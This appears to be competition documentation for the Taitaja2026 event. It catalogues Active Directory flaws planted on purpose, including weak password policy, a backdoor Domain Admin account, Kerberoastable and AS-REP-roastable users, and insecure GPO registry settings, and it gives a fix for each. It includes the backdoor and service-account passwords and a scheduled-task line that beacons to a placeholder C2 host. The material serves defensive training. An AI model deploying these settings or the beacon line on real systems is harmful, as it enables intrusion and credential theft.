# Intentional Flaws & Vulnerabilities

This document outlines the security vulnerabilities intentionally introduced into the Taitaja2026 Active Directory environment for event competition purposes. **DO NOT** use these configurations in a production environment.

## 1. Identity & Access Management

The following flaw is deployed via the `Scripts/GenerateIdentities.ps1` script.

### Weak Password Policy
*   **Difficulty:** **Easy**. This is a standard GPO configuration that every entry-level sysadmin should know.
*   **Description:** The default Domain Password Policy is drastically weakened.
    *   `PasswordComplexity` = 0 (Disabled)
    *   `MinimumPasswordLength` = 0
    *   `MinimumPasswordAge` = 0
*   **Impact:** Users can set trivial passwords (e.g., "1", "password"), making the domain highly susceptible to brute-force and password spraying attacks.
*   **Fix:**
    1.  Open **Group Policy Management** (`gpmc.msc`).
    2.  Navigate to **Forest** > **Domains** > **[Domain Name]** > **Default Domain Policy**.
    3.  Right-click **Default Domain Policy** and select **Edit**.
    4.  Navigate to **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Account Policies** > **Password Policy**.
    5.  Set **Password must meet complexity requirements** to **Enabled**.
    6.  Set **Minimum password length** to at least **7** (or standard 14).
    7.  Set **Minimum password age** to **1** day.

The following flaws are deployed via the `Scripts/Malicious.ps1` script.

### Privileged Account Backdoor
*   **Difficulty:** **Easy**. Identifying an unusual member of "Domain Admins" and deleting it is a fundamental cleanup task.
*   **Description:** This account represents the threat actor. A user named **"TheITGuy"** with the password (`P@ssw0rd1234!`) is created and added to the **Domain Admins** group.
*   **Impact:** In this context, the domain is already compromised, and this account serves as the threat actor's persistent foothold.
*   **Fix:**
    1.  Open **Active Directory Users and Computers** (`dsa.msc`).
    2.  Locate the user **"TheITGuy"** (usually in the `Users` container or a custom OU).
    3.  Right-click the user and select **Delete**, or at minimum, remove them from the **Domain Admins** group via the **Member Of** tab.

## 2. Persistence & C2

### Malicious Scheduled Task
*   **Difficulty:** **Medium**. While deleting the task is easy, *finding* it among dozens of legitimate system tasks requires the defender to know where to look for persistence.
*   **Task Name:** "HealthCheck"
*   **Description:** A scheduled task configured to run at logon with "HighestAvailable" privileges (SYSTEM).
    *   **Payload:** Executes a PowerShell encoded command that attempts to contact a C2 server:
        `IWR -Uri 'http://c2.129dkasnoauema.com/beacon' -UseBasicParsing`
*   **Impact:** Establishes persistence and initiates unauthorized network connections, mimicking a beaconing malware infection.
*   **Fix:**
    1.  Open **Task Scheduler** (`taskschd.msc`).
    2.  In the **Task Scheduler Library**, locate the task named **"HealthCheck"**.
    3.  Right-click the task and select **Delete**.

The following flaws are deployed via the `Scripts/Vulnerabilities.ps1` script.

### AS-REP Roasting
*   **Difficulty:** **Medium-Hard**. The fix is only a single check box. However, it is hard to identify which account has the setting enabled, even though the account's name is a hint for it.
*   **Description:** A user account **"PrintUser"** is created with the `Do not require Kerberos preauthentication` attribute enabled.
*   **Impact:** Attackers can request an AS-REP for this user without knowing their password, allowing them to capture the encrypted part of the response and crack the password (`salasana123`) offline.
*   **Fix:**
    1.  Open **Active Directory Users and Computers**.
    2.  Locate the **"PrintUser"** account.
    3.  Right-click and select **Properties**, then go to the **Account** tab.
    4.  In the **Account options** scroll box, uncheck **"Do not require Kerberos preauthentication"**.

### Kerberoasting
*   **Difficulty:** **Hard**. Understanding why an SPN on a user account is a risk requires knowledge of Kerberos internals. The fix (Resetting password and removing SPN) is conceptually complex.
*   **Description:** A service account **"SQLService"** is created with a registered Service Principal Name (SPN) `SQLService/db.domain.local`.
*   **Impact:** Attackers can request a TGS ticket for this service, take it offline, and crack the weak password (`kilpikonna`) to compromise the account.
*   **Fix:**
    1.  Open **Active Directory Users and Computers**.
    2.  Find the **"SQLService"** user.
    3.  Right-click and **Reset Password** to a long, complex, random string (25+ characters).
    4.  If the SPN is not required, remove it via command line: `setspn -D SQLService/db.domain.local SQLService`.


## 3. Group Policy Vulnerabilities (GPOs)

The following flaws are deployed via the `Scripts/GPOCreation.ps1` script.

### Local Administrator Escalation
*   **Difficulty:** **Easy**. Using "Restricted Groups" to grant privileges to Admins is common, but it is not a good practice. Noticing that "Domain Users" are in the "Administrators" group is a very clear and obvious red flag.
*   **GPO Name:** "Local Admins"
*   **Description:** Intended to add only IT staff, this GPO uses **Restricted Groups** to add the entire **"Domain Users"** group to the local **Administrators** group (SID S-1-5-32-544) on all computers.
*   **Impact:** Every user in the domain becomes a local administrator on any machine they log into, facilitating lateral movement and local credential dumping (Mimikatz).
*   **Fix:**
    1.  Open **Group Policy Management**.
    2.  Find the **"Local Admins"** GPO.
    3.  Right-click and select **Edit**.
    4.  Navigate to **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Restricted Groups**.
    5.  Remove the entry for **"Administrators"** that contains **"Domain Users"**, or specifically remove **"Domain Users"** from that group.

### Legacy Protocols (SMBv1 & WDigest)
*   **Difficulty:** **Easy**. Legacy protocols should themselves be a red flag. Deleting registry preferences in a GPO is straightforward.
*   **GPO Name:** "Backwards Compatibility"
*   **Description:** Enables deprecated and insecure protocols via Registry.
    *   **SMBv1:** `HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters` -> `SMB1 = 1`
    *   **WDigest:** `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` -> `UseLogonCredential = 1`
*   **Impact:** 
    *   **SMBv1:** Exposes the network to EternalBlue (MS17-010).
    *   **WDigest:** Forces LSASS to store plaintext passwords in memory, which can be easily extracted by tools like Mimikatz.
*   **Fix:**
    1.  Edit the **"Backwards Compatibility"** GPO.
    2.  Navigate to **Computer Configuration** > **Preferences** > **Windows Settings** > **Registry**.
    3.  Delete the registry values for **SMB1** and **UseLogonCredential**, or change their values to **0**.
    4.  Alternatively, use **Administrative Templates** to explicitly disable SMBv1 if available.

### LLMNR/NetBIOS Enabling
*   **Difficulty:** **Easy**. Although the GPO is misnamed, finding the "Turn off multicast name resolution" setting is a standard "hardening" step.
*   **GPO Name:** "Disable LLMNR and NBNS" (Misnamed)
*   **Description:** Sets `EnableMulticast` to `1` in the Registry.
*   **Impact:** Explicitly enables Link-Local Multicast Name Resolution (LLMNR), allowing attackers on the local subnet to perform poisoning attacks (Responder) to capture NTLMv2 hashes.
*   **Fix:**
    1.  Edit the **"Disable LLMNR and NBNS"** GPO.
    2.  Navigate to **Computer Configuration** > **Policies** > **Administrative Templates** > **Network** > **DNS Client**.
    3.  Set **"Turn off multicast name resolution"** to **Enabled**.

### AlwaysInstallElevated
*   **Difficulty:** **Medium**. This requires looking through Administrative Templates in two different locations (Computer and User), which can be tricky to find.
*   **GPO Name:** "Backwards Compatibility"
*   **Description:** Sets the `AlwaysInstallElevated` registry key to `1` in both HKLM and HKCU.
*   **Impact:** Allows any user to run MSI installation packages with SYSTEM privileges, a classic local privilege escalation vector.
*   **Fix:**
    1.  Edit the **"Backwards Compatibility"** GPO.
    2.  Navigate to **Computer Configuration** > **Policies** > **Administrative Templates** > **Windows Components** > **Windows Installer**.
    3.  Set **"Always install with elevated privileges"** to **Disabled**.
    4.  Repeat the same for **User Configuration** > **Policies** > **Administrative Templates** > **Windows Components** > **Windows Installer**.

### Remote Desktop Exposure
*   **Difficulty:** **Medium**. Finding the specific RDP security settings in Administrative Templates is a common task but changing the right configuration is the harder part.
*   **GPO Name:** "Remote Access"
*   **Description:** Enables RDP (`fDenyTSConnections = 0`) and lowers security settings:
    *   `UserAuthentication` = 0 (NLA Disabled)
    *   `SecurityLayer` = 0 (RDP Security, not SSL/TLS)
*   **Impact:** Allows RDP connections without Network Level Authentication (NLA), making the service vulnerable to Man-in-the-Middle (MitM) attacks and BlueKeep-style exploits.
*   **Fix:**
    1.  Edit the **"Remote Access"** GPO.
    2.  Navigate to **Computer Configuration** > **Policies** > **Administrative Templates** > **Windows Components** > **Remote Desktop Services** > **Remote Desktop Session Host** > **Security**.
        - Note: **"Allow users to connect remotely by using Remote Desktop Services"** must stay **Enable** or the student loses access to the DC.
    3.  Set **"Require user authentication for remote connections by using Network Level Authentication"** to **Enabled**.
    4.  Set **"Require use of specific security layer for remote (RDP) connections"** to **Enabled** and select **SSL (TLS 1.0)**.

### Weak Kerberos Encryption
*   **Difficulty:** **Hard**. This fix requires knowledge of how encryption works and why DES and RC4 are weak options.
*   **GPO Name:** "Encryption"
*   **Description:** Configures `SupportedEncryptionTypes` to `2147483647` (All types).
*   **Impact:** Re-enables weak encryption algorithms like RC4 and DES for Kerberos tickets, making them vulnerable to roasting (AS-REP Roasting, Kerberoasting) and offline cracking.
*   **Fix:**
    1.  Edit the **"Encryption"** GPO.
    2.  Navigate to **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**.
    3.  Find **"Network security: Configure encryption types allowed for Kerberos"**.
    4.  Open it and ensure only **AES128_HMAC_SHA1** and **AES256_HMAC_SHA1** (and Future types) are selected. Uncheck DES and RC4.

### Insecure Print Spooler (PrintNightmare)
*   **Difficulty:** **Hard**. While the mechanical fix is a simple toggle, identifying that this specific GPO is responsible for the PrintNightmare vulnerability requires niche security knowledge and research.
*   **GPO Name:** "Printer Drivers"
*   **Description:** Weakens "Point and Print Restrictions" policy.
    *   `Restricted` = 1
    *   `NoWarningNoElevationOnInstall` = 1
    *   `UpdatePromptSettings` = 2
*   **Impact:** Allows non-administrative users to install printer drivers from any server without a security prompt or elevation. This facilitates "PrintNightmare" style exploitation where an attacker can force the DC to install a malicious driver.
*   **Fix:**
    1.  Edit the **"Printer Drivers"** GPO.
    2.  Navigate to **Computer Configuration** > **Policies** > **Administrative Templates** > **Printers**.
    3.  Set **"Point and Print Restrictions"** to **Disabled** (Recommended) or **Not Configured**. This removes the insecure overrides and returns the system to its default secure state (requiring Admin rights for driver installation).
    4.  **Alternatively**, if the policy *must* remain **Enabled**, you must set both security prompts ("When installing drivers for a new connection" and "When updating drivers for an existing connection") to **"Show warning and elevation prompt"**.
